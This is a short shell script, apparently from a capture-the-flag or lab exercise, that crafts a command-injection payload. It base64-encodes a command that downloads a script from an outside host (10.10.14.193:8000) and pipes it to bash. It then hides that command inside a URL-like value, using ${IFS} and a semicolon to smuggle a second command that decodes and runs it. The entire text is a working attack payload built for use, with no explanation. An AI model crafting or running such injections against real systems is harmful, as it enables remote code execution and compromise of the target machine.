+++ crafter sh +++

CMD="bash -c 'curl http://10.10.14.193:8000|bash'"
B=$(echo $CMD | base64)

INJECT=$(printf '%s' \
  'http' \
  '://x;echo${IFS}' \
  "$B" \
  '|base64${IFS}-d|bash;a@0.0.0.0:8080/')

echo $INJECT


+++ EOF +++

